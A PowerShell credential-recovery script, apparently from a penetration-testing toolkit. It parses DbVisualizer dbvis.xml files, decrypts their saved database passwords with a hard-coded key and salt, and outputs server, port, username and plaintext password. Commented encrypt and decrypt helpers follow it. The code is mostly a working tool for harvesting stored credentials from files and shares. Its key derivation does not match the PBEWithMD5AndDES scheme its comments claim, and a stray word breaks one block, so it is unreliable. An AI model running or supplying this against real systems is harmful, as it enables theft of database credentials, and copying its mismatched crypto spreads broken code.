
# Author: Scott Sutherland, NetSPI (@_nullbind / nullbind)
# Intended input: dbvis.xml files

function Get-PwDbvisxml{
    param (
        [string]$ComputerName = $null,   # Optional
        [string]$ShareName    = $null,   # Optional
        [string]$UncFilePath  = $null,   # Optional
        [string]$FileName     = $null,   # Optional
        [string]$FilePath                # Required
    )

    # Parameters for password decryption
    $password = "qinda"  # hard-coded key
    $iterations = 10
    $salt = [byte[]]@(142, 18, 57, 156, 7, 114, 111, 90)

    # Create the key and cipher for PBEWithMD5AndDES
    $spec = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
    $key = $spec.GetBytes(8) # DES key size is 8 bytes
    $des = New-Object System.Security.Cryptography.DESCryptoServiceProvider
    $des.Key = $key
    $des.IV = $salt[0..7]
    $des.Padding = 'PKCS7'

    # Decrypt Function
    function Decrypt-Pw ($encryptedText) {
        $encryptedBytes = [Convert]::FromBase64String($encryptedText)
        $decryptor = $des.CreateDecryptor()
        $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    }

    # Load and parse dbvis.xml
    [xml]$xml = Get-Content -Path $FilePath

    # Extract connection details
    $connectionNode = $xml.dbvis.connections.connection

    # Extract required fields
    $targetServer = $connectionNode.url -replace 'jdbc:mysql://([^:/]+).*','$1'
    $targetPort = $connectionNode.url -replace '.*:(\d+)/.*','$1'
    $username = $connectionNode.user
    $passwordEnc = $connectionNode.password
    $decryptedPassword = Decrypt-Pw -encryptedText $passwordEnc

    # Return result object
    return [PSCustomObject]@{
        ComputerName = $ComputerName
        ShareName    = $ShareName
        UncFilePath  = $UncFilePath
        FileName     = $FileName
        Section      = "NA"
        ObjectName   = "NA"
        TargetURL    = "NA"
        TargetServer = $targetServer
        TargetPort   = $targetPort
        Database     = "NA"
        Domain       = "NA"
        Username     = $username
        Password     = $decryptedPassword
        PasswordEnc  = $passwordEnc
        KeyFilePath  = "NA"
    }
}

# Example command
# Get-PwDbvisxml -ComputerName "MyComputer" -ShareName "MyShare" -UncFilePath "\\MyComputer\MyShare\dbvis.xml" -FileName "dbvis.xml" -FilePath "C:\temp\dbvis.xml"

<# Sample dbvis.xml

<dbvis>
    <connections>
        <connection>
            <name>MyDatabaseConnection</name>
            <url>jdbc:mysql://localhost:3306/mydatabase</url>
            <user>db_user</user>
            <password>+mQwYxIFaEjZ/MWJDkm1SCWhHw7xPXWd</password> <!-- Encrypted using DES with default key or a master password -->
            <driver>com.mysql.jdbc.Driver</driver>
        </connection>
    </connections>
</dbvis>

#>

<# Bonus encryption and decryption functions

# Parameters
$password = "qinda"
$iterations = 10
$salt = [byte[]]@(142, 18, 57, 156, 7, 114, 111, 90)

# Create the key and cipher for PBEWithMD5AndDES
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($password)
$spec = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $spec.GetBytes(8) # DES key size is 8 bytes

# Initialize DES encryption with PKCS7 padding
$des = New-Object System.Security.Cryptography.DESCryptoServiceProvider
$des.Key = $key
$des.IV = $salt[0..7] # DES requires an 8-byte IV, derived from salt
$des.Padding = 'PKCS7' # Set padding mode to PKCS7

# Encrypt Function
function Encrypt-Pw ($plainText) {
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($plainText)
    $encryptor = $des.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    return [Convert]::ToBase64String($encryptedBytes)
}
that 
# Example usage
$plaintextPassword = "mydbvispasswordinclr"
$encryptedPassword = Encrypt-Pw -plainText $plaintextPassword
Write-Output "Encrypted Password: $encryptedPassword"

# -----------

# Parameters
$password = "qinda"
$iterations = 10
$salt = [byte[]]@(142, 18, 57, 156, 7, 114, 111, 90)

# Create the key and cipher for PBEWithMD5AndDES
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($password)
$spec = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations)
$key = $spec.GetBytes(8) # DES key size is 8 bytes

# Initialize DES encryption with PKCS7 padding
$des = New-Object System.Security.Cryptography.DESCryptoServiceProvider
$des.Key = $key
$des.IV = $salt[0..7] # DES requires an 8-byte IV, derived from salt
$des.Padding = 'PKCS7' # Set padding mode to PKCS7

# Decrypt Function
function Decrypt-Pw ($encryptedText) {
    $encryptedBytes = [Convert]::FromBase64String($encryptedText)
    $decryptor = $des.CreateDecryptor()
    $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)
    return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
}

# Example usage
$decryptedPassword = Decrypt-Pw -encryptedText $encryptedPassword
Write-Output "Decrypted Password: $decryptedPassword"

#>
